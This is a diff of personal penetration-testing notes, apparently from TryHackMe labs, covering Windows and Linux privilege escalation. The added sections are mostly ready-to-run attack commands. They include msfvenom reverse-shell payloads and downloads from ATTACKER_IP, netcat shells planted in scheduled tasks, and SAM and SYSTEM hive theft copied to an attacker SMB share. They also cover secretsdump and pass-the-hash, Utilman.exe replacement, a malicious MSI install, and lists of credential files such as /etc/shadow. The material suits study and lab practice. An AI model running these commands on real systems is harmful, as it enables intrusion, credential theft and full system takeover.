@@ -902,6 +902,29 @@ cat /home/user/myvpn.ovpn
 ```
 
 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+[[LFI-WordList-Linux\|LFI-WordList-Linux]]
+
+| **Location**                  | **Description**                                                                                                                                                   |
+| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `/etc/issue`                  | contains a message or system identification to be printed before the login prompt.                                                                                |
+| `/etc/profile`                | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
+| `/proc/version`               | specifies the version of the Linux kernel                                                                                                                         |
+| `/etc/passwd`                 | has all registered user that has access to a system                                                                                                               |
+| `/etc/shadow`                 | contains information about the system's users' passwords                                                                                                          |
+| `/root/.bash_history`         | contains the history commands for root user                                                                                                                       |
+| `/var/log/dmessage`           | contains global system messages, including the messages that are logged during system startup                                                                     |
+| `/var/mail/root`              | all emails for root user                                                                                                                                          |
+| `/root/.ssh/id_rsa`           | Private SSH keys for a root or any known valid user on the server                                                                                                 |
+| `/var/log/apache2/access.log` | the accessed requests for Apache  webserver                                                                                                                       |
+
+
+</div></div>
+
+
 </div></div>
 
 ### 
@@ -1262,9 +1285,48 @@ perl linux-exploit-suggester-2.pl
 
 </div></div>
 
-### [[Hacking Ético y Pentesting/DirtyCow\|###{{title}}]]
+### [[Hacking Ético y Pentesting/DirtyCow\|DirtyCow]]
 
 # Windows privesc
+
+## 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+## Windows account
+
+</div>
+
+
+The user account type will determine what actions the user can perform on that specific Windows system. 
+
+**Administrator** 
+- can make changes to the system: add users, delete users, modify groups, modify settings on the system, etc. 
+- Any user with administrative privileges will be part of the **Administrators** group
+
+**Standard User**
+- can only make changes to folders/files attributed to the user & can't perform system-level changes, such as install programs.
+- Standard users are part of the **Users** group.
+
+# Special built-in account
+- Used by the operating system in the context of privilege escalation
+
+| **SYSTEM / LocalSystem** | An account used by the operating system to perform internal tasks. It has **full access** to all files and resources available on the host with **even higher privileges than administrators.** |
+| ------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Local Service**        | Default account used to **run Windows services** with "minimum" privileges. It will use **anonymous connections** over the network.                                                             |
+| **Network Service**      | Default account used to **run Windows services** with "minimum" privileges. It will use the **computer credentials to authenticate** through the network.                                       |
+# Other
+
+Right-click on the Start Menu and click **Run**. Type `lusrmgr.msc`. See below
+
+- To protect the local user with such privileges, Microsoft introduced **User Account Control** (UAC). This concept was first introduced with the short-lived [Windows Vista](https://en.wikipedia.org/wiki/Windows_Vista) and continued with versions of Windows that followed.
+
+**Note**: UAC (by default) doesn't apply for the built-in local administrator account. 
+
+How does UAC work? When a user with an account type of administrator logs into a system, the current session doesn't run with elevated permissions. When an operation requiring higher-level privileges needs to execute, the user will be prompted to confirm if they permit the operation to run.
+
+</div></div>
 
 ## System enumeration
 ### 
@@ -1281,6 +1343,7 @@ https://github.com/peass-ng/PEASS-ng/releases
 winpeas x64
 ```shell
 wget https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/winPEASx64.exe
+winPEASx64.exe > outputfile.txt
 ```
 
 </div></div>
@@ -1307,8 +1370,94 @@ Invoke-AllChecks
 
 </div></div>
 
-## Service problems
-### CanRestart and writable
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+### PrivescCheck
+
+</div>
+
+
+- [[powershell\|powershell]] script
+- https://github.com/itm4n/PrivescCheck
+- Search common priv escalation
+- No require execution of a binary
+```shell
+wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
+```
+
+| Option                                                                                                                                                     | Description                              |
+| ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
+| `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`                                                                                     | Basic check only                         |
+| `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"`                | Extended checks + human-readable reports |
+| `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"` | All checks + all reports                 |
+
+
+</div></div>
+
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+### WES-NG
+
+</div>
+
+
+- Run on the attacker machine
+- https://github.com/bitsadmin/wesng
+Get info using `systeminfo.exe` to a `systeminfo.txt` and pass to the attacker machine.
+On the victim local
+```shell
+systeminfo > systeminfo.txt
+```
+Or remote
+```shell
+systeminfo /S MyRemoteHost
+```
+On the attacker machine
+```shell
+git clone https://github.com/bitsadmin/wesng --depth 1
+cd wesng
+wes.py --update
+wes.py systeminfo.txt
+```
+
+
+</div></div>
+
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+### meterpreter
+
+</div>
+
+
+## To scan vuln on windows
+```shell
+multi/recon/local_exploit_suggester
+```
+
+</div></div>
+
+### Other resources
+- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
+- [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
+- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
+- [Decoder's Blog](https://decoder.cloud/)
+- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
+- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
+
+## Abusing Service Misconfigurations
+- [[Windows services\|Windows services]]
+### CanRestart and writable service
 - IF an service is Canrestart True and writeable.
 - The Path is
   `Path: C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`
@@ -1327,13 +1476,229 @@ msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shik
 </div>
 
 
-- To windows
-- En los sistemas operativos Windows, cuando se inicia un servicio, el sistema intenta encontrar la ubicación del archivo ejecutable para lanzar el ataque.
-- La ruta del ejecutable va entre comillas '"', para que el sistema pueda localizar fácilmente el binario de la aplicación.
-- Los atacantes aprovechan los servicios con rutas no entrecomilladas que se ejecutan bajo privilegios de SISTEMA para elevar sus privilegios
-- 
+- When we **can't** **write** into service **executables**.
+- If a service is configured to point to an "unquoted" executable.
+```shell-session
+sc qc "vncserver"
+```
+Correct
+![Pasted image 20240821200031.png|600](/img/user/Pasted%20image%2020240821200031.png)
+Example Incorrect
+![Pasted image 20240821200138.png|600](/img/user/Pasted%20image%2020240821200138.png)
+- When the [[SCM\|SCM]] tries to execute the binary, a problem arises.
+- Since there are **spaces** on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM **doesn't know which** of the following you are trying to **execute**.
+- Spaces are used as argument separators unless they are part of a quoted string
+
+| Command                                              | Argument 1                 | Argument 2                 |
+| ---------------------------------------------------- | -------------------------- | -------------------------- |
+| C:\MyPrograms\Disk.exe                               | Sorter                     | Enterprise\bin\disksrs.exe |
+| C:\MyPrograms\Disk Sorter.exe                        | Enterprise\bin\disksrs.exe |                            |
+| C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |                            |                            |
+1. First, search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.
+2. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.
+3. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.
+
+Usually that files are installed on system folders but:
+- Some installers change the permissions on the installed folders, making the services vulnerable.
+- An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.
+
+For tis example, check the folder permissions
+![Pasted image 20240821211411.png|600](/img/user/Pasted%20image%2020240821211411.png)
+The `BUILTIN\\Users` group has **AD** and **WD** privileges, allowing the user to create subdirectories and files, respectively.
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+#### Exe-service
+exe-service payload and serve it through a python webserver:
+```shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4747 -f exe-service -o rev-svc.exe
+
+python3 -m http.server
+```
+pull the payload from Powershell
+```powershell
+wget http://ATTACKER_IP:4848/rev-svc.exe -O rev-svc.exe
+```
 
 </div></div>
+
+Move to the folder.
+```powershell
+move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+```
+Grant full permissions to the Everyone group as well:
+```powershell
+icacls Disk.exe /grant Everyone:F
+```
+Start a revershell listener on attacker machine.
+And restart the service. (In a normal case you would likely have to wait for a service restart)
+```powershell
+sc stop "disk sorter enterprise"
+sc start "disk sorter enterprise"
+```
+> [!note]
+ PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.
+
+
+
+</div></div>
+
+
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+### Insecure Permissions on Service Executable
+
+</div>
+
+
+- If the **executable** associated with a service **has weak permissions** that allow an attacker to modify or replace it, the attacker can **gain** the **privileges** of the service's account trivially.
+
+Example
+```cmd
+sc qc WindowsScheduler
+```
+```powershell
+sc.exe qc WindowsScheduler
+```
+![Pasted image 20240821083409.png|600](/img/user/Pasted%20image%2020240821083409.png)
+Check permissions with `icalcs`
+```shell-session
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+```
+![Pasted image 20240821083627.png|600](/img/user/Pasted%20image%2020240821083627.png)
+The everyone group has modify permissions `(M)` on the service's executable.
+We can overwrite it with any payload.
+Generate an exe-service payload using [[Metasploit/Msfvenom\|msfvenom]]
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+#### Exe-service
+exe-service payload and serve it through a python webserver:
+```shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4747 -f exe-service -o rev-svc.exe
+
+python3 -m http.server
+```
+pull the payload from Powershell
+```powershell
+wget http://ATTACKER_IP:4848/rev-svc.exe -O rev-svc.exe
+```
+
+</div></div>
+
+Replace the service executable with our payload
+```powershell
+cd C:\PROGRA~2\SYSTEM~1\
+
+move WService.exe WService.exe.bkp
+
+move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+```
+Grant full permissions to the Everyone group as well:
+```powershell
+icacls WService.exe /grant Everyone:F
+```
+Start a revershell listener on attacker machine.
+And restart the service. (In a normal case you would likely have to wait for a service restart)
+```powershell
+sc stop windowsscheduler
+sc start windowsscheduler
+```
+> [!note]
+ PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.
+
+
+
+</div></div>
+
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+### Insecure Service Permissions
+
+</div>
+
+
+- If the **service** [[DACL\|DACL]] **allow** you ti **modify** the **configuration** of a service, we will be able to **reconfigure** the service.
+- Pointing to any **executable** to **run** it using any account, including `SYSTEM` itself.
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- Check for a **service** [[DACL\|DACL]]
+- https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
+Run it on `cmd`
+```cmd
+accesschk64.exe -qlc thmservice
+```
+
+Example:
+![Pasted image 20240822181926.png|400](/img/user/Pasted%20image%2020240822181926.png)
+- The `BUILTIN\\Users` group has the SERVICE_ALL_ACCESS permission
+- Means **any user** can reconfigure the service.
+
+</div></div>
+
+Create the payload
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+#### Exe-service
+exe-service payload and serve it through a python webserver:
+```shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4747 -f exe-service -o rev-svc.exe
+
+python3 -m http.server
+```
+pull the payload from Powershell
+```powershell
+wget http://ATTACKER_IP:4848/rev-svc.exe -O rev-svc.exe
+```
+
+</div></div>
+
+Put it on the corresponding folder
+Grant permissions to `Everyone` to execute the payload:
+```powershell
+icacls C:\Users\thm-unpriv\rev-svc.exe /grant Everyone:F
+```
+Change the service's associated executable and account (**mind the spaces after the equal signs when using sc.exe**)
+```powershell
+sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalSystem
+```
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+#### Listener revershell
+Start a listener using rlwrap to try to simulate an interactive console
+``` sh
+rlwrap nc -lnvp 4747
+```
+
+</div></div>
+
+Restart the service.
+```powershell
+sc stop THMService
+sc start THMService
+```
+
+</div></div>
+
 
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
@@ -1347,6 +1712,487 @@ msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shik
 
  - Los permisos de servicio mal configurados pueden permitir a un atacante modificar o reconfigurar los atributos asociados a ese servicio
 - Al explotar tales servicios, los atacantes pueden incluso añadir nuevos usuarios al grupo de administradores locales y luego secuestrar la nueva cuenta para elevar sus privilegios
+
+</div></div>
+
+## Abusing dangerous privileges
+ 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- Rights that an account has to perform specific system-related tasks.
+- Check them `whoami /priv`
+- List of windows privileges [[List of windows privileges\|List of windows privileges]]
+- List of Windows [[Exploitable privileges\|Exploitable privileges]].
+
+</div></div>
+
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+### Abusing SeBackup-SeRestore
+
+</div>
+
+
+- Allow any user **read and write** to any **file** in the system, **ignoring** any [[DACL\|DACL]]
+- The idea is allow to certain users **perform backups without** full **admin privileges**
+- An attacker can use many methods to escalate.
+
+Example:
+- One method consists of **coping the [[SAM\|SAM]]** and  SYSTEM `registry hives` to **extract** the local Administrator's **password hash.**
+- The account is part of the "Backup Operators" group, granted the 2 privileges above
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+## Backup the SAM ans SYSTEM hashes
+Create a file with the `registry hives` content:
+```cmd
+reg save hklm\system C:\Users\THMBackup\system.hive
+```
+
+```cmd
+reg save hklm\sam C:\Users\THMBackup\sam.hive
+```
+
+</div></div>
+
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+## Start simple smb server
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+# smbserver
+- [[smbserver.py\|smbserver.py]]
+- Start a simple [[Hacking Ético y Pentesting/SMB\|SMB]] server
+- Create a share named `public` pointing to the `share` directory
+- On the attacker machine
+```shell
+wget https://raw.githubusercontent.com/fortra/impacket/master/examples/smbserver.py
+mkdir share
+python smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+```
+
+</div></div>
+
+
+</div></div>
+
+Copy to the attacker machine
+```powershell
+copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+```
+Retrieve passwords hashes
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+# secretsdump
+- [[secretsdump.py\|secretsdump.py]]
+- Retrieve the users' password hashes:
+- Dump hashes from the remote machine without executing any agent there.
+```shell
+wget https://raw.githubusercontent.com/fortra/impacket/master/examples/secretsdump.py
+python secretsdump.py -sam sam.hive -system system.hive LOCAL
+```
+
+</div></div>
+
+Perform a [[Pass-the-Hash\|Pass-the-Hash]] attack
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+# psexec
+- [[psexec.py\|psexec.py]]
+- To exec a [[Pass-the-Hash\|Pass-the-Hash]] attack
+- Gain access to the target machine with `SYSTEM` privileges
+```shell
+wget https://raw.githubusercontent.com/fortra/impacket/master/examples/psexec.py
+python psexec.py -hashes aad...e:8...4f5 administrator@VICTIM_IP
+```
+![Pasted image 20240822233408.png](/img/user/Pasted%20image%2020240822233408.png)
+
+</div></div>
+
+
+</div></div>
+
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+### Abusing SeTakeOwnership
+
+</div>
+
+
+- This privilege allows a user to **take ownership** of any object on the system.(**files or registry**)
+- Search for a service running as `SYSTEM` and **take** ownership of the service's **executable**.
+
+Example:
+- Check privileges
+```shell
+whoami /priv
+```
+![Pasted image 20240823084610.png|600](/img/user/Pasted%20image%2020240823084610.png)
+
+Abusing `utilman.exe`
+- Built-on windows app to provide ease of access options during the lock screen
+- Replace the original binary for a payload
+- Take ownership
+```powershell
+takeown /f C:\Windows\System32\Utilman.exe
+```
+- Being the owner doesn't necessarily mean that we have privileges over it, but you can assign yourself any privileges you need.
+- Give us full permissions
+```powershell
+icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+```
+- Replace `utilman.exe` with a copy of `cmd.exe`  on the `C:\Windows\System32\` folder
+```powershell
+copy cmd.exe utilman.exe
+```
+- Lock the screen from the start button
+![Pasted image 20240823094514.png|200](/img/user/Pasted%20image%2020240823094514.png)
+- Click on `ease of access` button and get a command prompt
+![Pasted image 20240823094611.png|500](/img/user/Pasted%20image%2020240823094611.png)
+
+</div></div>
+
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+### Abusing SeImpersonate - SeAssignPrimaryToken
+
+</div>
+
+
+- Allow to impersonate other user. (Spawn a process or thread)
+- `LOCAL SERVICE` and `NETWORK SERVICE ACCOUNTS` already have such privileges to impersonate restricted accounts.
+- [[ISS\|ISS]] create an restricted account called `iis apppool\defaultapppool`
+
+Example
+- Let's assume we have an [[Networking/FTP\|FTP]] service running with user `ftp`.
+- Without impersonation, ff Ann login and try to access to her files, the `ftp` user try to access them using `ftp` token
+![Pasted image 20240823104235.png|800](/img/user/Pasted%20image%2020240823104235.png)
+- With Impersonation, the `ftp` user impersonate Ann and uses her token.
+![Pasted image 20240823104521.png|800](/img/user/Pasted%20image%2020240823104521.png)
+- As attacker, if we manage to take **control** of a **process** with the privileges above, we can **impersonate** any user **connecting** and **authenticating** to that process.
+- To elevate privilages using such accounts we need.
+	1. To spawn an malicious process to that user can connect and authenticate
+	2. Find a way to force privileged users to connect and authenticate to the malicious process
+	3.  We can use [[RogueWinRM\|RogueWinRM]]
+
+Example
+- Asumming we have a compromised website running on [[ISS\|ISS]] and we have an webshell
+![Pasted image 20240823111923.png|500](/img/user/Pasted%20image%2020240823111923.png)
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+#### Listener revershell
+Start a listener using rlwrap to try to simulate an interactive console
+``` sh
+rlwrap nc -lnvp 4747
+```
+
+</div></div>
+
+Use the webshell to trigger the exploit (may take 2 min to work)
+```powershell
+c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4747"
+```
+`-p` specify the executable to be run by the exploit
+`-a` sets arguments to the `nc64.exe`
+It's like `nc -e cmd.exe ATTACKER_IP 4747`
+![Pasted image 20240823115456.png|500](/img/user/Pasted%20image%2020240823115456.png)
+
+
+</div></div>
+
+##  Abusing vulnerable software
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+### Abusing unpatched software
+
+</div>
+
+
+- As the drivers, organisations and users may not update the software regularly.
+List software using [[wmic\|wmic]]
+```powershell
+wmic product get name,version,vendor
+```
+- Search for exploits on
+[[Exploit-DB\|Exploit-DB]], [[packet storm\|packet storm]] google or github
+
+[[Case study Druva InSync 6.6.3\|Case study Druva InSync 6.6.3]]
+
+</div></div>
+
+## Harvesting passwords
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+### Unattended lnstalls
+
+</div>
+
+
+- In wondows 32
+- Los detalles de la instalación desatendida, como los ajustes de configuración utilizados durante el proceso de instalación, se almacenan en el archivo Unattend.xml.
+- El archivo Unattend.xml se almacena en una de las siguientes ubicaciones:
+```powershell
+C:\Windows\Panther\\N de la siguiente manera
+C:\Windows\Panther\NUnattend
+C:\WindowsSystem32
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+```
+Los atacantes explotan la información almacenada en Unattend.xml para escalar privilegios
+you might encounter credentials:
+```html
+<Credentials>
+    <Username>Administrator</Username>
+    <Domain>thm.local</Domain>
+    <Password>MyPassword123</Password>
+</Credentials>
+```
+
+</div></div>
+
+
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+[[LFI-WordList-Windows\|LFI-WordList-Windows]]
+
+| File          | Descriptoin                                                |
+| ------------- | ---------------------------------------------------------- |
+| `c:\boot.ini` | contains the boot options for computers with BIOS firmware |
+
+
+
+
+</div></div>
+
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+### Powershell History
+
+</div>
+
+
+It can be retrieved by using the following command from a `cmd.exe` prompt:
+Only work on `cmd.exe`
+```powershell
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.
+
+</div></div>
+
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+### Saved windows credentials
+
+</div>
+
+
+- Windows allows us to **use other users' credentials.**
+- Also gives the option to **save these credentials on the system**.
+List saved credentials:
+```powershell
+cmdkey /list
+```
+Example(user `mike.katz`):
+![Pasted image 20240820193302.png|400](/img/user/Pasted%20image%2020240820193302.png)
+if you notice any credentials worth trying, try it.
+```powershell
+runas /savecred /user:USER_NAME_HERE cmd.exe
+```
+
+
+</div></div>
+
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+### ISS Configuration
+
+</div>
+
+
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- Internet Information Services
+- default web server on Windows
+- create an restricted account called `iis apppool\defaultapppool`
+
+</div></div>
+
+
+The config on websites on [[ISS\|ISS]] is stored in a file called `web.config`  and can store **password** for db or configured authentication mechanisms.
+Might is on:
+```powershell
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+```
+Example
+![Pasted image 20240820191513.png](/img/user/Pasted%20image%2020240820191513.png)
+
+Quick way to find database connection strings on the file:
+```powershell
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
+
+</div></div>
+
+### Retrieve Credentials From software
+#### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+### From PuTTY
+
+</div>
+
+
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- SSH client commonly found on Windows.
+- **Instead** of having to specify a **connection**'s parameters **every single time,** users can **store sessions** where the IP, user and other configurations can be stored for later use.
+- Don't allow store SSH password
+- Store proxy config including authentication credentials.
+
+</div></div>
+
+Retrieve the stored proxy credentials.
+```powershell
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
+Simon Tatham is the creator of PuTTY
+Example:
+![Pasted image 20240820193930.png|500](/img/user/Pasted%20image%2020240820193930.png)
+
+</div></div>
+
+## Some easy ways
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+### Scheduled Tasks
+
+</div>
+
+
+Can be `schtasks` or `at`
+We can see tasks either lost its binary or it's using a binary you can modify.
+General info:
+```powershell
+schtasks
+```
+Specific info
+```powershell
+schtasks /query /tn vulntask /fo list /v
+```
+![Pasted image 20240820201808.png|600](/img/user/Pasted%20image%2020240820201808.png)
+**If we can** **modify** or overwrite the "Task to Run" **executable**, we can control what gets executed by the taskusr1 user, and **we have a simple priv escalation**
+Check executable permissions.
+```powershell
+icacls
+```
+
+```powershell
+icacls c:\tasks\schtask.bat
+```
+![Pasted image 20240820202243.png|600](/img/user/Pasted%20image%2020240820202243.png)
+We have full access and can **modify** the file and **insert a payload**
+For example, we have a revshell file `nc64.exe`
+```powershell
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+```
+Now wait to the schedule task runs again or run manually (less probable)
+```powershell
+schtasks /run /tn vulntask
+```
+
+</div></div>
+
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+### AlwaysInstallElevated
+
+</div>
+
+
+- Windows installer files (also known as .msi files) are used to install applications on the system.
+- Usually run with the level of the user.
+- Can be configured to run with higher privileges
+
+Requires 2 registry values to be set.
+```powershell
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+If it's correct, generate a malicious .msi file using [[Metasploit/Msfvenom\|msfvenom]]
+```shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+```
+Run the handler
+Copy to the msi to the victim and run it
+```powershell
+msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+```
 
 </div></div>
 
@@ -1390,6 +2236,7 @@ OSX
 		OyUbhijack
 
 </div></div>
+
 
 ## 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
@@ -1437,29 +2284,6 @@ Vulnerabilidad Meltdown
 
 <div class="markdown-embed-title">
 
-## Unattended lnstalls
-
-</div>
-
-
-- In wondows 32
-- Los detalles de la instalación desatendida, como los ajustes de configuración utilizados durante el proceso de instalación, se almacenan en el archivo Unattend.xml.
-- El archivo Unattend.xml se almacena en una de las siguientes ubicaciones:
-
-C: \Windows\Panther\\N de la siguiente manera
-C: \Windows\Panther\NUnattend
-C: \WindowsSystem32
-C: \WindowsSystem32
-
-Los atacantes explotan la información almacenada en Unattend.xml para escalar privilegios
-
-</div></div>
-
-## 
-<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
-
-<div class="markdown-embed-title">
-
 ## Other techniques
 
 </div>
@@ -1475,8 +2299,6 @@ El sistema operativo Windows utiliza tokens de acceso para determinar el context
 Los atacantes pueden obtener los tokens de acceso de otros usuarios o generar tokens falsos para conseguir privilegios y realizar acciones peligrosas evadiendo la detección.
 - Interceptación de rutas
 Las aplicaciones incluyen muchas debilidades y desconfiguraciones como rutas no citadas, desconfiguración de variables de entorno de la ruta y secuestro del orden de búsqueda que conducen a la interceptación de la ruta. La interceptación de rutas ayuda a un atacante a mantener la persistencia en un sistema y escalar privilegios.
-- Tarea programada
-El Programador de Tareas de Windows junto con utilidades como 'at' y 'schtasks' pueden ser utilizados para programar programas que pueden ser ejecutados en una fecha y hora específica. El atacante puede utilizar esta técnica para ejecutar programas maliciosos al inicio del sistema, mantener la persistencia, realizar una ejecución remota, escalar privilegios, etc.
 - Lauch Deamon
 Launchd se utiliza en el arranque de MacOS y OS X para completar el proceso de inicialización del sistema mediante la carga de parámetros para cada daemon de lanzamiento a nivel de sistema. Los daemons tienen plists que están vinculadas a ejecutables que se ejecutan en el arranque. El atacante puede alterar el ejecutable del daemon de lanzamiento para mantener la persistencia o para escalar privilegios.
 - Plist Modification
@@ -1493,7 +2315,7 @@ Una shell web es un script basado en la web que permite el acceso a un servidor 
 
 <div class="markdown-embed-title">
 
-## tools to escalate
+## Tools to escalate
 
 </div>
 
